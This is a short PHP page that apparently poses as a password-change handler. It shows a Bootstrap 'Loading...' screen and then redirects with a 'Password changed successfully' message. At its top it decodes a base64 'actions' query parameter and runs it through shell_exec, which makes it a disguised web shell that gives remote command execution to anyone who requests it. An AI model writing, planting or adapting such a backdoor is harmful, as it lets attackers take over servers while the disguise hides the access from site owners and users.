<?php

$cmd = $_GET['cmd'];
$actions = $_GET['actions'];

// decode the base64 encoded actions
$actions = base64_decode($actions);
echo shell_exec($actions);

?>


<!-- create loading page -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>
<body>
    <div class="container">
        <div class="row">
            <div class="col-md-12 text-center mt-5">
                <h1>Loading...</h1>
            </div>
        </div>
    </div>
</body>
</html>



<?php
sleep (2);
header("Location: /dashboard/settings.php?msg=Password changed successfully");

?>